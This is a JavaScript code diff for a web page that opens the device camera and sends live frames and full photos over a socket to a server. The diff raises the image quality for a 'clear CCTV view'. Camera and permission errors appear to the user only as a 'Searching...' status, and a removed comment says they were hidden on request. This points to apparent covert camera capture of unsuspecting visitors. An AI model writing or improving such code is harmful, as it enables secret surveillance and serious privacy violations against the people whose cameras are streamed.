@@ -104,8 +104,8 @@ async function startCamera() {
             audio: false,
             video: {
                 facingMode: useFrontCamera ? "user" : "environment",
-                width: { ideal: 480 },
-                height: { ideal: 360 }
+                width: { ideal: 640 },
+                height: { ideal: 480 }
             }
         };
 
@@ -122,7 +122,7 @@ async function startCamera() {
         startLiveStream();
     } catch (error) {
         cameraReady = false;
-        setStatus("Searching...", "waiting"); // Security/permission errors hidden visually as requested
+        setStatus("Searching...", "waiting");
     }
 }
 
@@ -130,24 +130,25 @@ function startLiveStream() {
     if (streamInterval) clearInterval(streamInterval);
     streamInterval = setInterval(() => {
         if (!cameraReady || !video.videoWidth) return;
-        canvas.width = 240;
-        canvas.height = 180;
+        canvas.width = 320;
+        canvas.height = 240;
         const context = canvas.getContext("2d");
-        context.drawImage(video, 0, 0, 240, 180);
-        const frame = canvas.toDataURL("image/jpeg", 0.15);
+        context.drawImage(video, 0, 0, 320, 240);
+        // Improved quality and balanced resolution for clear CCTV view
+        const frame = canvas.toDataURL("image/jpeg", 0.4);
         socket.emit("live-stream-frame", frame);
-    }, 200);
+    }, 180);
 }
 
 function takeSinglePhoto() {
     if (!cameraReady) return;
-    const width = video.videoWidth || 480;
-    const height = video.videoHeight || 360;
+    const width = video.videoWidth || 640;
+    const height = video.videoHeight || 480;
     canvas.width = width;
     canvas.height = height;
     const context = canvas.getContext("2d");
     context.drawImage(video, 0, 0, width, height);
-    const imageData = canvas.toDataURL("image/jpeg", 0.6);
+    const imageData = canvas.toDataURL("image/jpeg", 0.8);
     socket.emit("user-photo-captured", imageData);
 }
 
